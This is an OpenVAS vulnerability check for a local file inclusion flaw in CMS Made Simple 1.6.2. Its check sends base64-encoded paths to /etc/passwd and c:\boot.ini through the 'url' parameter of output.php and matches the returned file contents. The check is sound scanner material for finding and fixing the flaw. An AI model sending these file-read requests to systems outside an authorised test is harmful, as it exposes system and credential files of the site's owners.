###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_cms_made_simple_lfi_vuln.nasl 5394 2017-02-22 09:22:42Z teissa $
#
# CMS Made Simple 'modules/Printing/output.php' Local File Include Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the
  context of the webserver process.
  Impact Level: Application/System";
tag_affected = "CMS Made Simple version 1.6.2";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'url' parameter to 'modules/Printing/output.php' that allows remote attackers
  to view files and execute local scripts in the context of the webserver.";
tag_solution = "Upgrade CMS Made Simple Version 1.6.3 or later,
  For updates refer to http://www.cmsmadesimple.org/downloads/";
tag_summary = "This host is running CMS Made Simple and is prone to local file
  inclusion vulnerability.";

if(description)
{
  script_id(901141);
  script_version("$Revision: 5394 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-22 10:22:42 +0100 (Wed, 22 Feb 2017) $");
  script_tag(name:"creation_date", value:"2010-08-26 15:28:03 +0200 (Thu, 26 Aug 2010)");
  script_bugtraq_id(36005);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("CMS Made Simple 'modules/Printing/output.php' Local File Include Vulnerability");
  script_xref(name : "URL" , value : "http://www.cmsmadesimple.org/2009/08/05/announcing-cmsms-163-touho/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("cms_made_simple_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get directory from KB
dir = get_dir_from_kb(port:port, app:"cms_made_simple");
if(! dir) {
  exit(0);
}

foreach file (make_list("L2V0Yy9wYXNzd2Q=","YzpcYm9vdC5pbmk="))
{
  ## Try attack and check the response to confirm vulnerability.
  if(http_vuln_check(port:port, url:dir+"/modules/Printing/output.php?url="+file,
                     pattern:"(root:.*:0:[01]:|\[boot loader\])"))
  {
        security_message(port:port);
        exit(0);
  }
}
